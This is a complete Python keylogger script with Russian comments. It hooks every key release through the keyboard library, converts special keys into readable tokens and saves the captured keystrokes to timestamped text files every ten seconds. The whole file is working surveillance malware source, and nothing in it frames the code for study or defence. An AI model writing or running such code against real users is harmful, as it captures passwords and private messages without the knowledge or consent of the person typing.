import keyboard

from threading import Timer
from datetime import datetime

# Интервал сохранения в секундах
send_report_every = 10


class Keylogger:

    def __init__(self, interval):
        self.interval = interval
        self.filename = ""
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # Запись нажатий клавиатуры
    def callback(self, event):
        name = event.name
        # Специальные клавиши
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    # Создание метода txt файла
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # Метод создания файлов и сохранения логов
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    # Сохранение документа
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # Запускает класс заново после окончания времени интервала
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    Keylogger(interval=send_report_every).start()
